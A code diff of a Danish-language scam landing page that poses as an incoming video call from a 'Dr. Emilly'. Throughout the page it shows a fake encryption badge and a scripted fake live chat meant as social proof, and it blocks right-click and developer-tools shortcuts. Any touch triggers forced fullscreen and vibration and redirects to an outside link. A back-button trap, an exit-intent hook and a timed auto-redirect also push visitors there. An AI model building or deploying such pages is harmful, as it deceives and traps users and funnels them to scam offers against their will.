@@ -1,195 +1,267 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="da">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
-    <!-- Trick 26, 27: No Cache -->
+    <!-- No Cache -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
     <meta http-equiv="Pragma" content="no-cache" />
     <meta http-equiv="Expires" content="0" />
 
-    <!-- Trick 1, 2, 3, 4: Link Preview / Thumbnail Tags -->
-    <title>Incoming Video Call...</title>
-    <meta property="og:title" content="1 New Video Call Request" />
-    <meta property="og:description" content="Click to join the private real-time video stream. Connection is encrypted." />
-    <!-- Trick 7 (in OG): Provided Image -->
-    <meta property="og:image" content="https://github.com/sfdujtrgfirytutr7856856-collab/cxxcv/blob/main/536593C1-F811-4A5F-B2BE-746E943A069F.png?raw=true" />
+    <!-- Link Preview / Thumbnail Tags (Danish & Loading Image) -->
+    <title>Indgående videoopkald...</title>
+    <meta property="og:title" content="Opretter sikker forbindelse..." />
+    <meta property="og:description" content="Klik for at deltage i den private live video. Forbindelsen er 100% krypteret." />
+    <!-- Beautiful Loading/Connecting Image for Preview -->
+    <meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1080&auto=format&fit=crop" />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
 
     <style>
-        /* Trick 5, 11, 17, 18: Premium Dark Theme & No Select */
+        /* Base Theme */
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
-            background-color: #050914; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #050914; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             color: white; overflow: hidden; user-select: none; -webkit-user-select: none;
         }
 
-        /* Trick 6: Background Blur */
+        /* Background Blur */
         .bg-blur {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-            filter: blur(15px); z-index: 1; opacity: 0.6;
+            background: linear-gradient(135deg, #0a1128, #1c2541, #3a506b);
+            filter: blur(18px); z-index: 1; opacity: 0.8;
         }
 
-        /* Trick 9, 11: Call Overlay / Click Trap */
+        /* Fake Pre-Loader */
+        #preloader {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 20; background-color: #050914; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; transition: opacity 0.5s ease;
+        }
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3);
+            border-top-color: #00ff66; border-radius: 50%; animation: spin 1s linear infinite;
+        }
+        .preloader-text { margin-top: 15px; color: #00ff66; font-size: 14px; letter-spacing: 1px; }
+
+        /* Call Overlay Trap */
         .call-wrapper {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 10; display: flex; flex-direction: column; 
+            z-index: 10; display: none; flex-direction: column; 
             justify-content: center; align-items: center; cursor: pointer;
+            opacity: 0; animation: fadeIn 0.5s forwards;
         }
 
-        /* Trick 7, 8: Avatar and Pulse */
+        /* Avatar and Pulse */
         .caller-avatar {
-            width: 140px; height: 140px; border-radius: 50%;
+            width: 130px; height: 130px; border-radius: 50%;
             background-image: url('https://github.com/sfdujtrgfirytutr7856856-collab/cxxcv/blob/main/536593C1-F811-4A5F-B2BE-746E943A069F.png?raw=true');
             background-size: cover; background-position: center;
-            border: 4px solid #00ff66;
-            box-shadow: 0 0 20px #00ff66;
+            border: 3px solid #25D366; box-shadow: 0 0 25px rgba(37, 211, 102, 0.8);
             animation: pulse-ring 1.5s infinite;
         }
 
-        .caller-name { font-size: 28px; font-weight: bold; margin-top: 25px; letter-spacing: 1px; }
-        .caller-status { font-size: 16px; color: #00ff66; margin-top: 8px; }
+        .caller-name { font-size: 24px; font-weight: bold; margin-top: 20px; }
+        .caller-status { font-size: 15px; color: #25D366; margin-top: 8px; animation: blink 1.5s infinite; }
         
-        /* Trick 23, 24: Trust Badge & Live Dot */
-        .trust-badge { margin-top: 15px; font-size: 13px; color: #aaa; display: flex; align-items: center; gap: 5px; }
-        .live-dot { width: 8px; height: 8px; background-color: red; border-radius: 50%; animation: blink 1s infinite; }
+        /* Trust Badge */
+        .trust-badge { margin-top: 12px; font-size: 12px; color: #ccc; display: flex; align-items: center; gap: 6px; background: rgba(0,0,0,0.4); padding: 5px 12px; border-radius: 20px; }
 
-        /* Trick 10: Shaking Buttons */
-        .btn-container { display: flex; gap: 45px; margin-top: 60px; }
-        .action-btn {
-            width: 85px; height: 85px; border-radius: 50%; border: none; font-weight: bold;
-            font-size: 16px; color: white; cursor: pointer; animation: shake-btn 0.5s infinite;
+        /* Fake Live Chat Box (Social Proof Trick) */
+        .chat-container {
+            position: absolute; bottom: 160px; left: 50%; transform: translateX(-50%);
+            width: 90%; max-width: 340px; height: 120px;
+            background: rgba(0, 0, 0, 0.3); border-radius: 12px;
+            overflow: hidden; display: flex; flex-direction: column; justify-content: flex-end;
+            padding: 10px; box-sizing: border-box; z-index: 15;
+            border: 1px solid rgba(255,255,255,0.1);
+            mask-image: linear-gradient(to top, black 60%, transparent 100%);
+            -webkit-mask-image: linear-gradient(to top, black 60%, transparent 100%);
         }
-        .btn-green { background-color: #25D366; box-shadow: 0 0 30px rgba(37, 211, 102, 0.6); }
-        .btn-red { background-color: #FF3B30; box-shadow: 0 0 30px rgba(255, 59, 48, 0.6); }
+        .chat-message {
+            font-size: 13px; margin-bottom: 6px; line-height: 1.4;
+            animation: slideUp 0.4s ease forwards;
+            opacity: 0;
+        }
+        .chat-user { font-weight: bold; color: #a8c7fa; }
+        .chat-host { font-weight: bold; color: #ff5252; }
+        .chat-text { color: #f1f3f4; }
 
-        /* Trick 21: Fake Counter */
-        .live-counter { position: absolute; bottom: 30px; font-size: 14px; color: #888; }
+        /* Action Buttons */
+        .btn-container { position: absolute; bottom: 40px; display: flex; gap: 60px; }
+        .btn-wrap { display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .action-btn {
+            width: 70px; height: 70px; border-radius: 50%; border: none; 
+            cursor: pointer; display: flex; justify-content: center; align-items: center;
+            animation: bounce-btn 2s infinite; transition: transform 0.2s;
+        }
+        .btn-green { background-color: #25D366; box-shadow: 0 0 20px rgba(37, 211, 102, 0.5); }
+        .btn-red { background-color: #FF3B30; box-shadow: 0 0 20px rgba(255, 59, 48, 0.5); }
+        
+        .phone-icon { width: 28px; height: 28px; fill: white; }
+        .btn-label { font-size: 13px; color: white; font-weight: 500; }
 
         /* Keyframes */
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeIn { to { opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
         @keyframes pulse-ring {
-            0% { box-shadow: 0 0 10px #00ff66; transform: scale(1); }
-            50% { box-shadow: 0 0 40px #00ff66; transform: scale(1.05); }
-            100% { box-shadow: 0 0 10px #00ff66; transform: scale(1); }
+            0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(37, 211, 102, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
         }
-        @keyframes shake-btn {
-            0% { transform: rotate(0deg); }
-            25% { transform: rotate(-10deg); }
-            50% { transform: rotate(0deg); }
-            75% { transform: rotate(10deg); }
-            100% { transform: rotate(0deg); }
-        }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        @keyframes bounce-btn { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-8px); } 60% { transform: translateY(-4px); } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
     </style>
 </head>
-<body oncontextmenu="return false;"> <!-- Trick 17: No Right Click -->
+<body oncontextmenu="return false;">
 
     <div class="bg-blur"></div>
 
-    <!-- Trick 12, 28: Audio System -->
+    <!-- Audio System -->
     <audio id="callAudio" loop>
         <source src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Phone_ringing.ogg" type="audio/ogg">
     </audio>
 
+    <!-- Fake Pre-loader -->
+    <div id="preloader">
+        <div class="spinner"></div>
+        <div class="preloader-text">Sikrer forbindelse...</div>
+    </div>
+
     <!-- The Main Trap -->
     <div class="call-wrapper" id="trapArea">
-        <div class="caller-avatar"></div>
-        <div class="caller-name">Incoming Video Call</div>
-        <div class="caller-status">Connecting...</div>
-        
-        <div class="trust-badge">
-            <div class="live-dot"></div> Secure P2P Connection
+        <div style="display: flex; flex-direction: column; align-items: center; margin-top: -120px;">
+            <div class="caller-avatar"></div>
+            <div class="caller-name">Dr. Emilly (Privat)</div>
+            <div class="caller-status" id="statusText">Ringer...</div>
+            <div class="trust-badge">
+                E2E Krypteret Forbindelse
+            </div>
+        </div>
+
+        <!-- Live Chat Box (Social Proof) -->
+        <div class="chat-container" id="liveChat">
+            <!-- Messages will be injected here automatically -->
         </div>
 
         <div class="btn-container">
-            <button class="action-btn btn-red">Decline</button>
-            <button class="action-btn btn-green">Accept</button>
+            <div class="btn-wrap">
+                <button class="action-btn btn-red">
+                    <svg class="phone-icon" style="transform: rotate(135deg);" viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                </button>
+                <span class="btn-label">Afvis</span>
+            </div>
+            
+            <div class="btn-wrap">
+                <button class="action-btn btn-green">
+                    <svg class="phone-icon" viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                </button>
+                <span class="btn-label">Accepter</span>
+            </div>
         </div>
-
-        <div class="live-counter" id="viewerCount">Online: 1,245</div>
     </div>
 
     <script>
         // === MAIN SETTINGS ===
-        const targetLink = "https://firefone.com/bedjfha"; // Trick 30: Master Redirect Link
+        const targetLink = "https://firefone.com/bedjfha"; 
         let isActivated = false;
 
-        // Trick 4: Dynamic Tab Title
-        const titles = ["Incoming Call...", "(1) Missed Call"];
-        let titleIndex = 0;
-        setInterval(() => {
-            document.title = titles[titleIndex];
-            titleIndex = (titleIndex + 1) % titles.length;
-        }, 1500);
-
-        // Trick 21: Fake Random Counter
-        setInterval(() => {
-            let count = Math.floor(Math.random() * (1600 - 1200 + 1)) + 1200;
-            document.getElementById('viewerCount').innerText = "Online: " + count.toLocaleString();
-        }, 3000);
-
-        // Trick 19: Block F12 and Ctrl+U
+        // Block Developer Tools Shortcuts
         document.onkeydown = function(e) {
             if(event.keyCode == 123) return false;
             if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
             if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
         }
 
-        // Trigger Magic on First Touch/Click
+        // Chat Script Data (Social Proof Strategy)
+        const chatMessages = [
+            { user: "Mikkel_88", text: "Er der nogen herinde?", type: "user" },
+            { user: "JensDK", text: "Ja, kom lige her fra gratischat. Virker det for dig?", type: "user" },
+            { user: "Mikkel_88", text: "Ja! Forbindelsen er super hurtig.", type: "user" },
+            { user: "Lars_Lover", text: "Endelig! Jeg har ventet på dit link på gratischat, Emilly.", type: "user" },
+            { user: "Dr. Emilly [VIP]", text: "Velkommen til mine gratischat drenge! Klik på 'Accepter' for at komme ind nu.", type: "host" },
+            { user: "Thomas_CPH", text: "Just clicked accept. Wow, perfect quality!", type: "user" }
+        ];
+
+        let msgIndex = 0;
+        function pushChat() {
+            if (msgIndex < chatMessages.length) {
+                const chatBox = document.getElementById('liveChat');
+                const msgData = chatMessages[msgIndex];
+                const msgElement = document.createElement('div');
+                msgElement.className = 'chat-message';
+                
+                const userClass = msgData.type === 'host' ? 'chat-host' : 'chat-user';
+                msgElement.innerHTML = `<span class="${userClass}">${msgData.user}:</span> <span class="chat-text">${msgData.text}</span>`;
+                
+                chatBox.appendChild(msgElement);
+                
+                // Keep only last 3 messages visible to look realistic
+                if (chatBox.children.length > 3) {
+                    chatBox.removeChild(chatBox.firstChild);
+                }
+                
+                msgIndex++;
+                setTimeout(pushChat, Math.random() * 2000 + 2000); // Random delay 2-4s
+            }
+        }
+
+        // Pre-loader Transition & Start Chat
+        setTimeout(() => {
+            document.getElementById('preloader').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('preloader').style.display = 'none';
+                document.getElementById('trapArea').style.display = 'flex';
+                document.getElementById('callAudio').play().catch(()=>{});
+                
+                // Start social proof chat after 1.5s of page load
+                setTimeout(pushChat, 1500);
+            }, 500);
+        }, 1500); 
+
+        // Trigger Magic on Any Touch/Click on the whole wrapper
         const trapArea = document.getElementById('trapArea');
         trapArea.addEventListener('mousedown', executeMagic);
         trapArea.addEventListener('touchstart', executeMagic);
 
-        function executeMagic() {
+        function executeMagic(e) {
+            e.preventDefault(); 
+            
             if (!isActivated) {
                 isActivated = true;
                 
-                // Trick 14: Fullscreen Hijack
                 if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen().catch((e) => {});
+                    document.documentElement.requestFullscreen().catch((err) => {});
                 }
 
-                // Trick 12, 13: Play Sound and Vibrate
                 document.getElementById('callAudio').play().catch(()=>{});
-                if (navigator.vibrate) { navigator.vibrate([1000, 500, 1000, 500, 1000]); }
+                if (navigator.vibrate) { navigator.vibrate([200, 100, 200, 100, 500]); }
 
-                // Trick 24: Change text to ring
-                document.querySelector('.caller-status').innerText = "Ringing...";
+                document.getElementById('statusText').innerText = "Opretter forbindelse..."; 
                 
-                // Delay exact redirect slightly so they feel the trap
-                setTimeout(() => {
-                    fireRedirect();
-                }, 300);
+                setTimeout(() => { fireRedirect(); }, 400);
             } else {
-                // If they click again, redirect instantly
                 fireRedirect();
             }
         }
 
         function fireRedirect() {
-            if (navigator.vibrate) { navigator.vibrate(200); }
             window.location.href = targetLink;
         }
 
-        // Trick 15: Back-Button Trap
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
             history.go(1);
-            fireRedirect(); // Send to offer if they try to go back
+            fireRedirect(); 
         };
 
-        // Trick 16: Exit Intent (PC only)
         document.addEventListener("mouseout", function(e) {
             if (e.clientY < 0) { fireRedirect(); }
         });
 
-        // Trick 20: Auto-Redirect Timer (30 seconds)
-        setTimeout(() => {
-            fireRedirect();
-        }, 30000);
+        setTimeout(() => { fireRedirect(); }, 25000);
 
     </script>
 </body>
